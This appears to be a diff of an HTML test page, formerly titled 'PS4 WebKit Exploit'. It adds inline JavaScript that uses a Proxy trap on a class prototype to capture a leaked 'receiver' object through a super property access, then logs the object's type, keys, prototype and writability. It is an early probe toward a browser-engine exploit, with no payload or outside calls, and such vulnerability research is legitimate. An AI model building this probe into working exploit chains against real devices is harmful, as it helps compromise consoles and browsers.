@@ -1,17 +1,123 @@
 <!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8" />
-  <title>PS4 WebKit Exploit</title>
-  <style>
-    body { font-family: monospace; background: #111; color: #0f0; padding: 1em; }
-    pre#log { white-space: pre-wrap; }
-  </style>
-</head>
+<html>
 <body>
-  <h1>PS4 WebKit Exploit</h1>
-  <pre id="log">[+] Loading...</pre>
+<pre id="out"></pre>
+<script>
+function log(msg) {
+    document.getElementById('out').textContent += msg + '\n';
+}
 
-  <script src="Leak_test_exploit.js"></script>
+function inspectLeakedReceiver(leakedReceiver) {
+    log("Inspecting leaked receiver...");
+
+    try {
+        log(`typeof: ${typeof leakedReceiver}`);
+    } catch (e) {
+        log(`typeof threw: ${e.message}`);
+    }
+
+    try {
+        log(`toString: ${String(leakedReceiver)}`);
+    } catch (e) {
+        log(`toString threw: ${e.message}`);
+    }
+
+    try {
+        log(`valueOf: ${leakedReceiver.valueOf()}`);
+    } catch (e) {
+        log(`valueOf threw: ${e.message}`);
+    }
+
+    try {
+        log(`receiver + "": ${leakedReceiver + ""}`);
+    } catch (e) {
+        log(`coercion threw: ${e.message}`);
+    }
+
+    try {
+        log(`Object.prototype.toString.call: ${Object.prototype.toString.call(leakedReceiver)}`);
+    } catch (e) {
+        log(`toString.call threw: ${e.message}`);
+    }
+
+    try {
+        log(`Object.getPrototypeOf: ${Object.getPrototypeOf(leakedReceiver)}`);
+    } catch (e) {
+        log(`getPrototypeOf threw: ${e.message}`);
+    }
+
+    try {
+        log(`Object.keys: ${JSON.stringify(Object.keys(leakedReceiver))}`);
+    } catch (e) {
+        log(`Object.keys threw: ${e.message}`);
+    }
+
+    try {
+        log(`Reflect.ownKeys: ${JSON.stringify(Reflect.ownKeys(leakedReceiver))}`);
+    } catch (e) {
+        log(`Reflect.ownKeys threw: ${e.message}`);
+    }
+
+    try {
+        log(`getOwnPropertyDescriptors: ${JSON.stringify(Object.getOwnPropertyDescriptors(leakedReceiver))}`);
+    } catch (e) {
+        log(`getOwnPropertyDescriptors threw: ${e.message}`);
+    }
+
+    try {
+        log(`Is extensible: ${Object.isExtensible(leakedReceiver)}`);
+    } catch (e) {
+        log(`isExtensible threw: ${e.message}`);
+    }
+
+    try {
+        leakedReceiver._test = 1337;
+        log(`Write test: _test = 1337 assigned`);
+    } catch (e) {
+        log(`Write test threw: ${e.message}`);
+    }
+
+    try {
+        log(`_test value: ${leakedReceiver._test}`);
+    } catch (e) {
+        log(`Read _test threw: ${e.message}`);
+    }
+
+    try {
+        log(`instanceof Object: ${leakedReceiver instanceof Object}`);
+    } catch (e) {
+        log(`instanceof threw: ${e.message}`);
+    }
+}
+
+function leakReceiverViaProxy() {
+    class Leaker {
+        leak() {
+            return super.prop;
+        }
+    }
+
+    let captured = null;
+
+    Leaker.prototype.__proto__ = new Proxy({}, {
+        get(target, prop, receiver) {
+            captured = receiver;
+            log(`[+] Proxy trap triggered with property: ${prop}`);
+            return 123;
+        }
+    });
+
+    const { leak } = Leaker.prototype;
+    leak(); // trigger
+
+    if (captured) {
+        inspectLeakedReceiver(captured);
+    } else {
+        log("[-] Failed to capture receiver.");
+    }
+}
+
+leakReceiverViaProxy();
+</script>
 </body>
 </html>
